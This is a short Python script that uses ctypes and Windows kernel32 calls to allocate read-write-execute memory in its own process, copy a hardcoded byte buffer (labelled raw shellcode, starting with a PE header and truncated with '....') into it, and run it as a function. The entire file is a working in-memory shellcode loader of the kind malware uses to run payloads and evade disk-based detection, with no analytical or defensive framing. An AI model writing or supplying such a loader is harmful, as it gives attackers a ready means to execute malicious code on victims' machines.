import ctypes
import threading
from ctypes import wintypes

MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

buf =  b""
buf += b"\x4d\x5a\x41\x52\x55\x48\x89\xe5\x48\x83\xec\x20"
buf += b"\x48\x83\xe4\xf0\xe8\x00\x00\x00\x00\x5b\x48\x81"
buf += b"\xc3\xe3\x60\x00\x00\xff\xd3\x48\x81\xc3\x08\xb7"
buf += b"\x02\x00\x49\x89\xd8\x6a\x04\x5a\xff\xd0\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\xf8\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\x09\xcd"
buf += b"\x21\xb8\x01\x4c\xcd\x21\x54\x68\x69\x73\x20\x70"
buf += b"\x72\x6f\x67\x72\x61\x6d\x20\x63\x61\x6e\x6e\x6f"
buf += b"\x74\x20\x62\x65\x20\x72\x75\x6e\x20\x69\x6e\x20"
buf += b"\x44\x4f\x53\x20\x6d\x6f\x64\x65\x2e\x0d\x0d\x0a"
buf += b"\x24\x00\x00\x00\x00\x00\x00\x00\x8f\x55\x4a\x59"....


# Define functions from kernerl32.dll
kernel32 = ctypes.windll.kernel32
kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID
kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL

def ThreadFunction(lpParameter):
    current_process = kernel32.GetCurrentProcess()

    # Allocate memory with `VirtualAllocEx`
    sc_memory = kernel32.VirtualAllocEx(current_process, None, len(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    bytes_written = ctypes.c_size_t(0)

    # Copy raw shellcode with `WriteProcessMemory`
    kernel32.WriteProcessMemory(current_process, sc_memory,ctypes.c_char_p(buf),len(buf),ctypes.byref(bytes_written))

    # Execute shellcode in memory by casting the address to a function pointer with `CFUNCTYPE`
    shell_func = ctypes.CFUNCTYPE(None)(sc_memory)
    shell_func()

    return 1